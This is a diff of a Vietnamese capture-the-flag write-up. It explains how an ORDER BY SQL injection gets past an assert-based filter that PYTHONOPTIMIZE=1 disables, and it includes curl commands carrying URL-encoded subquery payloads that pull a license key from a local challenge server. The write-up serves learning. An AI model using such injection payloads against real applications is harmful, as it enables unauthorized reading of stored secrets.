@@ -19,29 +19,30 @@ Status: Not started
 ## Summary
 
 <Callout type="note" title="Note">
-💡 SQLinjection, Use **order by**
+💡 SQL injection, use **ORDER BY**.
 
 </Callout>
 
 ## Description
 
-- Bài này, mình không làm được khi giải đang diễn ra. Sau khi, giải kết thúc mình đọc writeup và lưu lại theo cách hiểu của mình.
+- Bài này mình không làm được khi giải đang diễn ra. Sau khi giải kết thúc mình đọc writeup và lưu lại theo cách hiểu của mình.
 
 ## Analyst
 
-- Đầu tiên bài này, đọc src code có thể thấy ngay lỗ hổng SQLi tuy nhiên lại bị strict filter nên việc tấn công SQL là không thể.
-- Tuy nhiên, nếu đọc file [run.sh](http://run.sh) nhận thấy có **PYTHONOPTIMIZE=1 ? HIỂU LÀ GÌ?**
+- Đầu tiên đọc source code có thể thấy ngay lỗ hổng SQLi, tuy nhiên bị strict filter nên việc tấn công SQL là không thể.
+- Tuy nhiên, nếu đọc file `run.sh` sẽ thấy có **PYTHONOPTIMIZE=1**.
 
 ![Untitled](/uploads/data-explorer/data-explorer/untitled.png)
 
-- Đọc qua thì có thể hiểu giá trị này sẽ disable assert trong python.
+- Đọc qua thì có thể hiểu giá trị này sẽ disable `assert` trong Python.
 
 ![Untitled](/uploads/data-explorer/data-explorer/untitled-1.png)
 
-- Từ đấy ta có ý tưởng tấn công hàm filter_order khi không cần ASC, DESC.
-- Ý tưởng chính của bài này là ta sẽ sử dụng order by sort trên 1 additional column để xác định ký tự và trên 1 order để xác định vị trí trong key của license.
-  - Chẳng hạn như sau: ta có key là : abc
-  - Ta có table là:
+- Từ đấy ta có ý tưởng tấn công hàm `filter_order` mà không cần `ASC`/`DESC`.
+- Ý tưởng chính là dùng `ORDER BY` trên 1 cột phụ để xác định ký tự, và trên 1 cột khác để xác định vị trí trong key của license.
+  - Ví dụ: key là `abc`.
+  - Ta có table:
+
     | aaa | pos |
     | --- | --- |
     | a   | 1   |
@@ -50,7 +51,9 @@ Status: Not started
     | a   | 4   |
     | a   | 5   |
     | a   | 6   |
-  - Ta order by substr(’abc’ || key, 1),pos → thì mỗi giá trị sẽ được gán theo bảng chữ cái + key
+
+  - Ta `ORDER BY substr('abc' || key, 1), pos` → mỗi giá trị sẽ được gán theo bảng chữ cái + key:
+
     | aaa | pos | addition col |
     | --- | --- | ------------ |
     | a   | 1   | a            |
@@ -59,7 +62,9 @@ Status: Not started
     | a   | 4   | a            |
     | a   | 5   | b            |
     | a   | 6   | c            |
-  - Sau đó nó sẽ được sort theo addition col, r sau đó sẽ sort theo pos → Từ đó ta sẽ có các ký tự tương ứng theo từng vị trí.
+
+  - Sau đó nó sẽ được sort theo `addition col`, rồi sort theo `pos` → ta có các ký tự tương ứng theo từng vị trí:
+
     | aaa | pos | addition col |
     | --- | --- | ------------ |
     | a   | 1   | a            |
@@ -71,8 +76,8 @@ Status: Not started
 
 ## Exploit
 
-- Để nhận biết được ký tự nào khi sort ta sẽ cần thêm các row ‘0-9’ + ‘a-f’ → TỪ ĐÓ 1 file create của ta sẽ có 128 + 16 = 144 row.
-- generate file.txt
+- Để nhận biết được ký tự nào khi sort ta sẽ cần thêm các row `0-9` + `a-f` → do đó file create sẽ có `128 + 16 = 144` row.
+- Generate `exploit.txt`:
 
 ```jsx
 with open("exploit.txt", "w+") as f:
@@ -81,19 +86,19 @@ with open("exploit.txt", "w+") as f:
     f.write(f"a,{i}\n")
 ```
 
-- Tối đa 1 query sẽ có 200 row mà key của cta là 256 ký tự. Ta cần thực hiện 2 query để có thể lấy hết được key. Tuy nhiên khi create bảng sẽ bị redirect và mất 1 query nên ta sẽ sử dụng curl, để k bị redirect.
+- Tối đa 1 query sẽ có 200 row, mà key là 256 ký tự. Ta cần thực hiện 2 query để lấy hết key. Tuy nhiên khi create bảng sẽ bị redirect và mất 1 query nên ta sẽ dùng `curl` để không bị redirect.
 
 <Callout type="note" title="Note">
-💡 curl '[http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e](http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%201%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)
+💡 `curl 'http://0.0.0.0:8000/view/686220e0-6aa2-47d2-849d-7cbc2b05799e' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%201%29%2C+pos%2C+1%29+from+license%29%2C+pos' > x.in`
 
 </Callout>
 
 <Callout type="note" title="Note">
-💡 curl '[http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845](http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845)' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%20129%29%2C+pos%2C+1%29+from+license%29%2C+pos' > [x.in](http://x.in/)
+💡 `curl 'http://0.0.0.0:8000/view/5e8196d3-36e2-405f-bc99-23976cb97845' --data-raw 'order-col=aaa&order-od=%2C+%28select+substr%28%270123456789abcdef%27+%7C%7C+substr%28key%2C%20129%29%2C+pos%2C+1%29+from+license%29%2C+pos' > x.in`
 
 </Callout>
 
-- code để lấy key. Ý tưởng của code, vì sort theo các ký tự trc, sau đó mới đến số thứ tự, nên ta cần phải có 1 cách để nhận biết được ký tự nào với ký tự nào. Vì vậy ta sẽ up lên file 144 row thêm 16 ký tự để làm mốc. Dò theo từng mốc là xđinh được từng ký tự.
+- Code để lấy key. Vì sort theo ký tự trước, sau đó mới đến số thứ tự, nên cần cách nhận biết ký tự nào với ký tự nào. Vì vậy ta sẽ up lên file 144 row thêm 16 ký tự để làm mốc. Dò theo từng mốc là xác định được từng ký tự.
 
 ```jsx
 import re
